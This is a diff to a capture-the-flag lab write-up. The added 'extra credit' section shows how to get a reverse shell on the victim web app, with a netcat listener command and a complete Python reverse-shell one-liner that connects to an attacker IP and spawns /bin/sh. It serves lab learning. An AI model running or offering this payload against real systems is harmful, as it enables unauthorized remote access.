@@ -207,6 +207,19 @@ sudo less /root/3rd.txt into the command panel\
 \
 **LOOKS LIKE THAT IS THE LAST INGREDIENT! WOHOO!**
 
+**EXTRA CREDIT!** Getting a reverse shell. I can do this because I can execute commands on the web app (victim machine). 
+
+1. A listener on our atttack machine
+            → -nc -lvnp 1234 will accomplish this. 
+\
+2. Run this python script:
+\
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.158.38",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+\
+
+
+
+
 ### Lessons Learned:
 
 \
@@ -223,4 +236,3 @@ learn the CTF\'s.\
 \
 **If you are reading this and have any comments/ suggestions on
 how I can improve this write-up or write-ups in the future; Please reach out to me on discord username: terminalpilot or jon.accounts@protonmail.com. My goal with write-ups is to help others understand the solution, explain my process, explain my struggles, and ultimately learn with you and 'own' the techniques.**
-
